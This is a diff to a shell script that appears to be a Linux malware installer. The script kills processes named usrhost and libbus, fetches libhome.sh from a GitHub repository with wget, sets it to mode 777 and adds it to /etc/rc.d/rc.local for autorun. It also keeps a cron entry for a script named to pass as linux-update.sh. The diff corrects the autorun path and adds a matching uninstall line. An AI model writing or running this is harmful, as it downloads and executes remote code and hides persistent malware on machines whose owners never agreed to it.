@@ -3,6 +3,8 @@
 #uninstall
 sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab
 
+sed -i '\/home\/libhome.sh/d' /etc/rc.d/rc.local
+
 killall usrhost
 killall libbus
 
@@ -31,7 +33,7 @@ echo '*/5 * * * * root /usr/bin/linux-update.sh >/dev/null 2>&1'>>/opt/MyCron/ro
 #down libhome and write to autorun
 wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome.sh -O /home/libhome.sh
 chmod 777 /home/libhome.sh
-echo '/home/libhome'>>/etc/rc.d/rc.local
+echo '/home/libhome.sh'>>/etc/rc.d/rc.local
 
 #run libhost
 /home/libhome.sh &
